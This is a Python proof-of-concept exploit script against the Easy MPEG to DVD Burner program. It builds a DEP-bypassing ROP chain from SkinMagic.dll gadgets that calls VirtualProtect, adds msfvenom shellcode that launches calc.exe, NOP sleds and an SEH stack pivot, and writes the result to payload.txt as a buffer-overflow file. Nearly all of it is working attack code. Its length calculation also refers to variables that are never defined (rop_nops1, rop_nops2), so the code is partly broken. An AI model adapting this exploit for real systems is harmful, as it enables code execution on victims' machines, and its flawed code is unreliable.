# Easy MPEG to DVD Exploit

import sys
import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      
      #[---INFO:gadgets_to_set_edx:---]
      0x10039df8,  # FILLER
      0x10033aef,  # POP EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x10032cde,  # Pointer to 0x16
      0x10032f5c,  # POP EDX # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0xfffffffe,
      0x1001c0e4,  # ADD EDX,DWORD PTR [EAX] # POP ESI # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x40404040,  # FILLER
      0x1001c0e4,  # ADD EDX,DWORD PTR [EAX] # POP ESI # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x40404040,  # FILLER
      0x1001c0e4,  # ADD EDX,DWORD PTR [EAX] # POP ESI # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x40404040,  # FILLER
      #[---INFO:gadgets_to_set_ebx:---]
      0x10033aef,  # POP EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x41414141,  # FILLER
      0x10037c11,  # MOV EAX,200 # POP EBP # RETN    ** [SkinMagic.dll] **   |  ascii
      0x41414143,  # FILLER  
      0x10036aa7,  # INC EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0x10035a07,  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      #[---INFO:gadgets_to_set_ecx:---]
      0x10039df8,  # POP ECX # RETN [SkinMagic.dll] 
      0x1005982d,  # &Writable location [SkinMagic.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100342f0,  # POP EDI # RETN [SkinMagic.dll] 
      0x10032982,  # RETN (ROP NOP) [SkinMagic.dll]
      #[---INFO:gadgets_to_set_esi:---]
      0x100328b3,  # POP ESI # RETN [SkinMagic.dll] 
      0x762a432f,  # ptr to &VirtualProtect() [IAT SkinMagic.dll]
      #[---INFO:gadgets_to_set_ebp:---]
      0x10025faa,  # POP EBP # RETN [SkinMagic.dll] 
      0x10034a43,  # ptr to call esp
      #[---INFO:pushad:---]
      0x10033de6,  # POP EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      0xa140acd2,  # Value to be added with 5EFFC883 to get 0x00407555 (PUSHAD)
      0x10033315,  # ADD EAX,5EFFC883 # RETN    ** [SkinMagic.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x1003248d,  # PUSH EAX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}
      #[---INFO:extras:---]
      0x10034a43,  # ptr to call esp
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()
  
#msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f python

shellcode = ("\xd9\xed\xba\x67\x7b\x7d\xb9\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x31\x31\x50\x18\x83\xc0\x04\x03\x50\x73\x99\x88\x45\x93\xdf"
"\x73\xb6\x63\x80\xfa\x53\x52\x80\x99\x10\xc4\x30\xe9\x75\xe8"
"\xbb\xbf\x6d\x7b\xc9\x17\x81\xcc\x64\x4e\xac\xcd\xd5\xb2\xaf"
"\x4d\x24\xe7\x0f\x6c\xe7\xfa\x4e\xa9\x1a\xf6\x03\x62\x50\xa5"
"\xb3\x07\x2c\x76\x3f\x5b\xa0\xfe\xdc\x2b\xc3\x2f\x73\x20\x9a"
"\xef\x75\xe5\x96\xb9\x6d\xea\x93\x70\x05\xd8\x68\x83\xcf\x11"
"\x90\x28\x2e\x9e\x63\x30\x76\x18\x9c\x47\x8e\x5b\x21\x50\x55"
"\x26\xfd\xd5\x4e\x80\x76\x4d\xab\x31\x5a\x08\x38\x3d\x17\x5e"
"\x66\x21\xa6\xb3\x1c\x5d\x23\x32\xf3\xd4\x77\x11\xd7\xbd\x2c"
"\x38\x4e\x1b\x82\x45\x90\xc4\x7b\xe0\xda\xe8\x68\x99\x80\x66"
"\x6e\x2f\xbf\xc4\x70\x2f\xc0\x78\x19\x1e\x4b\x17\x5e\x9f\x9e"
"\x5c\x90\xd5\x83\xf4\x39\xb0\x51\x45\x24\x43\x8c\x89\x51\xc0"
"\x25\x71\xa6\xd8\x4f\x74\xe2\x5e\xa3\x04\x7b\x0b\xc3\xbb\x7c"
"\x1e\xa0\x5a\xef\xc2\x09\xf9\x97\x61\x56")


#Bad: \x00\x0a\x0d  

# ROP NOPs to lead into the rop chain
rop_nops = "\xf8\x9d\x03\x10" * 40 #0x10039df8 :  # POP ECX # RETN    ** [SkinMagic.dll] **   |   {PAGE_EXECUTE_READ}

#NOP sled to run into the shellcode
nops = "\x90" * 60

# Stack pivot 
seh = "\xee\x43\x40" #0x004043ee : {pivot 2004 / 0x7d4} :  # ADD ESP,7D4 # RETN    ** [Easy MPEG to DVD Burner.exe] **   |  startnull {PAGE_EXECUTE_READ}
buff = rop_nops + rop_chain + nops + shellcode + (1012 - len(rop_nops1) - len(rop_nops2) - len(rop_chain) - len(nops) - len(shellcode)) * "A" + seh

with open('payload.txt','wb') as f:
      f.write(buff)
